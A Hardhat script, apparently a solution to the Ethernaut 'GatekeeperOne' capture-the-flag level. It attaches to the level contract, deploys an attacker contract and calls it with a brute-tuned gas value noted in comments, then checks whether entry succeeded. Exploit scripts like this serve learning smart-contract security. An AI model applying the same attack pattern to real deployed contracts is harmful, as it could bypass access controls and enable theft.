const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0xBB27Fc38DB9476c2EdaeEC80d1fb34c060999E01";
    contractName = "GatekeeperOne";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    // const level = await Level.deploy();
    console.log(`Level at address ${level.address}`);

    let result = await level.entrant();
    console.log(result);
    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(level.address);
    // const attacker = await Attacker.attach("0x0B6f113d2EF95832f498a45E1273d4E5542AC13F");
    console.log(`Attacker at ${attacker.address}`);

    let tx = await attacker.attack(819354);//819354-819109 863758-863513//1380252-1077347//1638448-1077296 //Operations until gateTwo takes 819365-819117=248 819117 816257
    let tr = await tx.wait();

    result = await level.entrant();
    console.log(result);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
